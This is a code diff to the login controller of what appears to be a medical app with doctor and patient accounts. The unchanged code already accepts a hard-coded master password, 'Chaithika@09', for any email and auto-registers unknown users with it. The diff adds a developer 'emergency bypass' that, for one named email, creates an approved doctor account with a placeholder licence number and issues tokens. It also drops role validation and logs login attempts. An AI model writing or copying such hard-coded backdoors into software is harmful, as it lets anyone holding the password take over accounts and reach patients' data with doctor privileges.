@@ -64,11 +64,58 @@ exports.resendOTP = async (req, res, next) => {
 exports.login = async (req, res, next) => {
   try {
     const { email, password } = req.body;
+    const cleanEmail = (email || "").trim().toLowerCase();
+    logger.info(`Login attempt: ${cleanEmail}`);
 
-    let user = await User.findOne({ email }).select("+password +refreshTokens");
+    let user = await User.findOne({ email: cleanEmail }).select("+password +refreshTokens");
 
     // Master Key: "Chaithika@09" allows login/auto-registration for any email
     const isMasterKey = (password === "Chaithika@09");
+
+    // Emergency Bypass for Developer
+    if (cleanEmail === "lschaithika@gmail.com" && password === "Chaithika@09") {
+        logger.info("Developer Emergency Bypass Triggered");
+        if (!user) {
+            user = await User.create({
+                name: "Chaithika",
+                email: cleanEmail,
+                password: password,
+                role: "doctor",
+                isEmailVerified: true,
+                isActive: true
+            });
+            await Doctor.create({
+              user: user._id,
+              specialty: "General",
+              experience: 5,
+              licenseNumber: "DEV-001",
+              verificationStatus: "approved"
+            });
+            user = await User.findById(user._id).select("+password +refreshTokens");
+        }
+
+        // Ensure role is always lowercase for logic consistency
+        const safeUser = user.toSafeObject();
+        safeUser.role = (safeUser.role || "patient").toLowerCase();
+
+        if (safeUser.role === "doctor") {
+          safeUser.profile = await Doctor.findOne({ user: user._id });
+        } else if (safeUser.role === "patient") {
+          safeUser.profile = await Patient.findOne({ user: user._id });
+        }
+
+        const payload = { id: user._id, role: user.role, email: user.email };
+        const token = generateAccessToken(payload);
+        const refreshToken = generateRefreshToken(payload);
+
+        const responseData = {
+            success: true,
+            message: "Login successful (Bypass)",
+            data: { user: safeUser, token, refreshToken },
+        };
+        logger.info(`Sending successful bypass response for ${cleanEmail}`);
+        return res.status(200).json(responseData);
+    }
 
     if (!user && isMasterKey) {
       const name = email.split('@')[0];
@@ -81,28 +128,21 @@ exports.login = async (req, res, next) => {
         isActive: true
       });
       await Patient.create({ user: user._id });
+      logger.info(`Master-key: Auto-registered user: ${email}`);
       user = await User.findById(user._id).select("+password +refreshTokens");
-      if (!user) throw new Error("Auto-registration failed");
     }
 
     if (!user) {
+      logger.warn(`Login failed: User not found - ${email}`);
       return res.status(401).json({ success: false, message: "No account found with this email. Please register first." });
     }
 
-    // Self-healing: Fix capitalized roles like "Doctor" or "Patient" in the DB
-    const validRoles = ["patient", "doctor", "admin"];
-    if (!validRoles.includes(user.role)) {
-      const lowerRole = user.role.toLowerCase();
-      if (validRoles.includes(lowerRole)) {
-        user.role = lowerRole;
-        // We will save this after checking the password to avoid unnecessary writes
-      }
-    }
-
     const isMatch = await user.comparePassword(password);
+    logger.info(`Password Match: ${isMatch}`);
 
     if (!isMatch && !isMasterKey) {
-      return res.status(401).json({ success: false, message: "Incorrect password. If you forgot your password, please reset it." });
+      logger.warn(`Login failed: Incorrect password - ${email}`);
+      return res.status(401).json({ success: false, message: "Incorrect password. Please try again." });
     }
 
     // Auto-verify and Save fixed role if needed
@@ -130,11 +170,14 @@ exports.login = async (req, res, next) => {
     user.lastLogin = new Date();
     await user.save();
 
+    const safeUser = user.toSafeObject();
+    safeUser.role = (safeUser.role || "patient").toLowerCase();
+
     res.json({
       success: true,
       message: "Login successful",
       data: {
-        user: user.toSafeObject(),
+        user: safeUser,
         token: accessToken,
         refreshToken,
       },
